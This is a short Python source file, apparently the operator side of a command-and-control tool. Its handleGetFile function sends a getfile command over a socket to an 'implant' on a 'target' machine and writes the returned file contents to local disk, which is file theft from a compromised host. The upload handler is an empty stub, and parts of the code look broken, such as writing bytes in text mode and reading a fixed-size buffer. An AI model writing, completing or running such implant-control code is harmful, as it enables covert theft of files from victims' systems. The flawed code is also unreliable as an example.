# Patrick Sacchet
# File handles all functionality pertaining to files on target

import socket
import ctypes

import Common


# Get file off of target and write it to disk locally 
def handleGetFile(sock : socket.socket, target_file_path : str, local_file_path : str) -> bool:

    # Send our command to the implant 
    # getfile -> CommandDetails -> Command
    getfile_path = Common.GetFileCommand(filepath=target_file_path.encode('utf-8'))
    getfile_details = Common.CommandDetails(getfilecommand=getfile_path)
    getfile_command = Common.Command(command=Common.Commands.getfile, commanddetails=getfile_details)

    bytes_sent = sock.send(bytes(getfile_command))

    print(f"Sent {bytes_sent} bytes to implant")

    # Parse our response
        # TODO: max size of file 1024 bytes? or just that many in one read...
    data = sock.recv(1032)

    filedata = ctypes.cast(data, ctypes.POINTER(Common.Response))

    # Get the file size
    print(f"Received file {filedata.contents.responsedetails.getfileresponse.filesize} bytes large")

    # Copy it to disk
    with open(local_file_path, 'w') as file:
        file.write(filedata.contents.responsedetails.getfileresponse.filebytes)
        file.close()

    print(f"Wrote {filedata.contents.filesize} bytes to {local_file_path}")

    return True

def handlePutFile(sock) -> bool:
    return True